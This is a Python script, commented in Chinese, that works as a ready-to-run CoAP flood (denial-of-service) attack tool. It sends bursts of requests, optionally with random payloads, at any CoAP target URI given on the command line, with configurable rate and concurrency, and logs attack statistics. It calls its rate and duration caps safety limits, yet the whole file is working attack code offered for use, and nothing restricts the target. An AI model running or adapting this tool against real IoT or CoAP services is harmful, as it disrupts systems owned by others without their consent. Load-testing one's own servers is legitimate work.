#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CoAP 泛洪攻击脚本 (CoAP Flood Attack Script)

此脚本向目标CoAP服务器发送大量请求，模拟DoS泛洪攻击。
包含时长限制、速率控制和并发限制以避免系统崩溃。

使用方法:
    python coap_flood_attack.py <target_uri> [options]

示例:
    python coap_flood_attack.py coap://localhost/sensor --duration 10 --rate 20 --concurrent 5
"""

import asyncio
import argparse
import logging
import time
import random
import string
from datetime import datetime
from aiocoap import Context, Message, GET, POST, PUT, DELETE

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class FloodAttack:
    """CoAP泛洪攻击类"""
    
    def __init__(self, target_uri, method='GET', duration=30, rate=20, 
                 concurrent=10, random_payload=False, payload_size=100):
        """
        初始化泛洪攻击
        
        Args:
            target_uri: 目标CoAP URI
            method: HTTP方法 (GET, POST, PUT, DELETE)
            duration: 攻击持续时间(秒)，默认30秒
            rate: 每秒发送请求数，默认20
            concurrent: 最大并发请求数，默认10
            random_payload: 是否使用随机负载
            payload_size: 负载大小(字节)
        """
        self.target_uri = target_uri
        self.method = method.upper()
        self.duration = duration
        self.rate = rate
        self.concurrent = concurrent
        self.random_payload = random_payload
        self.payload_size = payload_size
        
        self.sent_count = 0
        self.success_count = 0
        self.error_count = 0
        self.semaphore = asyncio.Semaphore(concurrent)
        
    def generate_random_payload(self):
        """生成随机负载"""
        if self.random_payload:
            return ''.join(random.choices(
                string.ascii_letters + string.digits, 
                k=self.payload_size
            )).encode()
        return b"flood_attack_payload"
    
    async def send_flood_request(self, context, request_id):
        """发送单个泛洪请求"""
        async with self.semaphore:  # 限制并发数
            try:
                # 创建请求
                payload = self.generate_random_payload()
                request = Message(
                    code=getattr(__import__('aiocoap'), self.method),
                    uri=self.target_uri,
                    payload=payload
                )
                
                # 发送请求（设置超时）
                response = await asyncio.wait_for(
                    context.request(request).response,
                    timeout=3.0
                )
                
                self.sent_count += 1
                self.success_count += 1
                
                if self.sent_count % 50 == 0:
                    logger.info(
                        f"进度: {self.sent_count} 请求 "
                        f"(成功: {self.success_count}, 失败: {self.error_count})"
                    )
                
            except asyncio.TimeoutError:
                self.sent_count += 1
                self.error_count += 1
                logger.debug(f"请求 #{request_id} 超时")
            except Exception as e:
                self.sent_count += 1
                self.error_count += 1
                logger.debug(f"请求 #{request_id} 失败: {e}")
    
    async def run(self):
        """执行泛洪攻击"""
        logger.info("=" * 60)
        logger.info("CoAP 泛洪攻击开始")
        logger.info("=" * 60)
        logger.info(f"目标: {self.target_uri}")
        logger.info(f"方法: {self.method}")
        logger.info(f"持续时间: {self.duration} 秒")
        logger.info(f"速率: {self.rate} 请求/秒")
        logger.info(f"最大并发: {self.concurrent}")
        logger.info(f"随机负载: {'是' if self.random_payload else '否'}")
        if self.random_payload:
            logger.info(f"负载大小: {self.payload_size} 字节")
        logger.info("=" * 60)
        
        context = await Context.create_client_context()
        
        try:
            logger.info(f"\n开始泛洪攻击，持续 {self.duration} 秒...")
            start_time = time.time()
            request_id = 0
            
            while time.time() - start_time < self.duration:
                batch_start = time.time()
                
                # 批量创建任务
                tasks = []
                for _ in range(self.rate):
                    request_id += 1
                    task = asyncio.create_task(
                        self.send_flood_request(context, request_id)
                    )
                    tasks.append(task)
                
                # 等待所有任务完成或超时
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # 速率控制：确保每秒发送指定数量的请求
                elapsed = time.time() - batch_start
                if elapsed < 1.0:
                    await asyncio.sleep(1.0 - elapsed)
            
            # 等待所有剩余任务完成
            logger.info("\n等待剩余请求完成...")
            await asyncio.sleep(2)
            
            # 攻击结束统计
            logger.info("\n" + "=" * 60)
            logger.info("攻击完成")
            logger.info("=" * 60)
            logger.info(f"总发送请求数: {self.sent_count}")
            logger.info(f"成功: {self.success_count}")
            logger.info(f"失败: {self.error_count}")
            logger.info(f"成功率: {self.success_count/self.sent_count*100:.2f}%" if self.sent_count > 0 else "N/A")
            logger.info(f"平均速率: {self.sent_count/self.duration:.2f} 请求/秒")
            logger.info("=" * 60)
            
        finally:
            await context.shutdown()


async def main():
    parser = argparse.ArgumentParser(
        description='CoAP泛洪攻击工具 - 向目标发送大量CoAP请求',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 基本泛洪攻击
  python coap_flood_attack.py coap://localhost/sensor
  
  # 高速率攻击，持续60秒
  python coap_flood_attack.py coap://localhost/sensor -d 60 -r 50
  
  # 使用随机负载的POST攻击
  python coap_flood_attack.py coap://localhost/data -m POST --random-payload --payload-size 500
        """
    )
    
    parser.add_argument('target', help='目标CoAP URI (例如: coap://localhost/sensor)')
    parser.add_argument('-m', '--method', default='GET', 
                       choices=['GET', 'POST', 'PUT', 'DELETE'],
                       help='CoAP方法 (默认: GET)')
    parser.add_argument('-d', '--duration', type=int, default=30,
                       help='攻击持续时间(秒) (默认: 30, 最大: 300)')
    parser.add_argument('-r', '--rate', type=int, default=20,
                       help='每秒请求数 (默认: 20, 最大: 200)')
    parser.add_argument('-c', '--concurrent', type=int, default=10,
                       help='最大并发请求数 (默认: 10, 最大: 50)')
    parser.add_argument('--random-payload', action='store_true',
                       help='使用随机生成的负载')
    parser.add_argument('--payload-size', type=int, default=100,
                       help='负载大小(字节) (默认: 100, 最大: 1024)')
    
    args = parser.parse_args()
    
    # 安全限制
    duration = min(args.duration, 300)  # 最大5分钟
    rate = min(args.rate, 200)  # 最大200请求/秒
    concurrent = min(args.concurrent, 50)  # 最大50并发
    payload_size = min(args.payload_size, 1024)  # 最大1KB
    
    if args.duration > 300:
        logger.warning(f"持续时间限制为300秒，已调整")
    if args.rate > 200:
        logger.warning(f"速率限制为200请求/秒，已调整")
    if args.concurrent > 50:
        logger.warning(f"并发限制为50，已调整")
    if args.payload_size > 1024:
        logger.warning(f"负载大小限制为1024字节，已调整")
    
    attack = FloodAttack(
        target_uri=args.target,
        method=args.method,
        duration=duration,
        rate=rate,
        concurrent=concurrent,
        random_payload=args.random_payload,
        payload_size=payload_size
    )
    
    await attack.run()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("\n攻击被用户中断")

